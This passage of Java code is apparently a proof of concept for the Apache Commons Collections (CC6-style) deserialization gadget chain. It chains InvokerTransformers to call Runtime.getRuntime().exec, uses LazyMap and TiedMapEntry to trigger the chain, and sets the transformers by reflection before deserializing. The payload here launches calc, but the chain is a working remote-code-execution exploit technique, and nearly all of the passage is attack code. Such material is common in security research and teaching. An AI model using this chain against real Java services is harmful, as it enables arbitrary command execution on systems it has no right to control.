                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer c = new ChainedTransformer(new Transformer[0]);
        HashMap h = new HashMap();
        Map l = LazyMap.decorate(h,c);
        try {
            TiedMapEntry tiedMapEntry = new TiedMapEntry(l,"aa");
            HashMap hashMap = new HashMap();
            hashMap.put(tiedMapEntry,"sakuya");
            l.remove("aa");
            Class clazz = c.getClass();
            Field iTransformers =  clazz.getDeclaredField("iTransformers");
            iTransformers.setAccessible(true);
            iTransformers.set(c,t);
            deseriazler.deserialize(hashMap);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

